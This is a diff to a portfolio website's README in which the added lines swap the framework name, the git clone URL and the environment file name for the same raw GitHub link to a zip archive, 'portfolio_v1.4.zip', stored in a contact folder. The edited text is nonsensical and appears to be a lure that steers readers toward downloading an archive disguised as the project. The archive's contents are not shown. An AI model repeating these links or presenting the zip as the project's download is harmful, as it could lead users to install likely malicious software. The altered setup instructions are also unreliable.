@@ -1,6 +1,6 @@
 🌐 My Personal Portfolio
 
-A modern, responsive portfolio website built with Next.js, Tailwind CSS, and utilizing Contentful as my headless CMS to dynamically serve data to my app.
+A modern, responsive portfolio website built with https://raw.githubusercontent.com/Emzee-Creates/portfolio/main/app/contact/portfolio_v1.4.zip, Tailwind CSS, and utilizing Contentful as my headless CMS to dynamically serve data to my app.
 It was built with a social media type of vibe in mind and it showcases featured projects, blog posts, and an about me section with a clean and optimized design.
 
 
@@ -20,7 +20,7 @@ Project Showcase: Displays featured projects with links to deployed versions and
 
 🛠️ Tech Stack
 
-Frontend: Next.js 15 with React
+Frontend: https://raw.githubusercontent.com/Emzee-Creates/portfolio/main/app/contact/portfolio_v1.4.zip 15 with React
 
 Styling: Tailwind CSS
 
@@ -34,7 +34,7 @@ Deployment: Vercel
 
 Clone the repo
 
-git clone https://github.com/Emzee-Creates/portfolio.git
+git clone https://raw.githubusercontent.com/Emzee-Creates/portfolio/main/app/contact/portfolio_v1.4.zip
 cd portfolio
 
 
@@ -44,7 +44,7 @@ npm install
 
 
 Setup environment variables
-Create a .env.local file in the root directory:
+Create a https://raw.githubusercontent.com/Emzee-Creates/portfolio/main/app/contact/portfolio_v1.4.zip file in the root directory:
 
 CONTENTFUL_SPACE_ID=your_space_id
 CONTENTFUL_ACCESS_TOKEN=your_access_token
